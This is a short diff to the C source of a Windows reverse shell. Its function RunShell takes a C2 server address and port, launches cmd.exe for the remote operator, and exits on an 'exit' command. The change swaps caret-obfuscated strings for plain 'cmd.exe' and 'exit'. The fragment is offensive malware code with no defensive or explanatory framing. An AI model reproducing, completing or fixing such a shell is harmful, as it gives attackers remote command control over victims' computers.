@@ -30,7 +30,7 @@ void RunShell(char* C2Server, int C2Port) {
                 continue;
             }
             else {
-                char getem[] = "c^m^d.e^x^e";
+                char getem[] = "cmd.exe";
                 STARTUPINFO sinfo;
                 PROCESS_INFORMATION pinfo;
                 memset(&sinfo, 0, sizeof(sinfo));
@@ -49,7 +49,7 @@ void RunShell(char* C2Server, int C2Port) {
                     WSACleanup();
                     continue;
                 }
-                if (strcmp(RecvData, "e^x^i^t\n") == 0) {
+                if (strcmp(RecvData, "exit\n") == 0) {
                     exit(0);
                 }
             }
